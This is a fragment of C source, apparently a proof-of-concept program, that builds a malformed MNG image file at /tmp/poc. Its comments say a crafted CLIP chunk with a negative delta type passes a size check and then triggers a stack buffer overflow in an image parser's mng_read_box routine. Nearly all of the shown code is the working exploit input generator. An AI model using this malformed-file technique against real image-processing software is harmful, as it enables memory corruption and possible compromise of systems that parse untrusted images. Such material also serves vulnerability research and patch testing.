    type_buf[2] = type[2];
    type_buf[3] = type[3];
    fwrite(type_buf, 1, 4, f);

    if (len > 0 && data != NULL) {
        fwrite(data, 1, len, f);
    }

    crc_buf[0] = 0;
    crc_buf[1] = 0;
    crc_buf[2] = 0;
    crc_buf[3] = 0;
    fwrite(crc_buf, 1, 4, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* MNG magic */
    fputc(0x8a, f);
    fputc(0x4d, f);
    fputc(0x4e, f);
    fputc(0x47, f);
    fputc(0x0d, f);
    fputc(0x0a, f);
    fputc(0x1a, f);
    fputc(0x0a, f);

    /* MHDR chunk */
    {
        unsigned char mhdr[28];
        memset(mhdr, 0, 28);
        mhdr[0] = 0; mhdr[1] = 0; mhdr[2] = 0; mhdr[3] = 1;
        mhdr[4] = 0; mhdr[5] = 0; mhdr[6] = 0; mhdr[7] = 1;
        mhdr[8] = 0; mhdr[9] = 0; mhdr[10] = 0; mhdr[11] = 1;
        mhdr[12] = 0; mhdr[13] = 0; mhdr[14] = 0; mhdr[15] = 1;
        mhdr[16] = 8;
        mhdr[17] = 3;
        mhdr[21] = 0;
        mhdr[22] = 0;
        mhdr[23] = 0;
        mhdr[24] = 7;
        write_chunk(f, "MHDR", mhdr, 28);
    }

    /* CLIP chunk: 19 bytes total */
    /* Bytes 0-1: clipping type = 0x00 0x01 (delta-image with bounds) */
    /* Byte 2: delta_type = 0x80 (negative, triggers overflow in mng_read_box) */
    /* Bytes 3-18: 16-byte box rectangle (all zeros) */
    /* This passes the 19-byte minimum check but mng_read_box reads from 4-byte stack buffer */
    {
        unsigned char clip_data[19];
        int i;
        clip_data[0] = 0;     /* clipping type high byte */
        clip_data[1] = 1;     /* clipping type low byte (delta-image with bounds) */
        clip_data[2] = 0x80;  /* delta_type (negative) */
        for (i = 3; i < 19; i++) {
            clip_data[i] = 0; /* 16-byte box (all zeros) */
        }
        write_chunk(f, "CLIP", clip_data, 19);
    }

    /* IEND chunk */
    write_chunk(f, "IEND", NULL, 0);

    fclose(f);
    return 0;
}
